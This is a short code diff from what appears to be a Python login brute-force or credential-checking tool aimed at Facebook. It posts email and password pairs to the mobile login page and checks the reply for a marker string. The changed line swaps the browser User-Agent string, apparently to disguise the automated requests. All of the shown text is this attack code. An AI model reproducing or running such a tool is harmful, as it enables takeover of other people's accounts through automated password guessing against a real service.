@@ -128,7 +128,7 @@ else:
              
                 link = 'https://d.facebook.com/login.php'
                 data = {'email':felling,  'pass':fellings}
-                headers = {'User-Agent':'Opera/8.84 (Windows NT 6.0; sl-SI) Presto/2.11.164 Version/12.00 '}
+                headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.20.6 (KHTML, like Gecko) Version/5.0.2 Safari/535.20.6'}
                 
                 shot = requests.post(link,headers=headers,data=data).text
                 if 'xc_message' in shot:
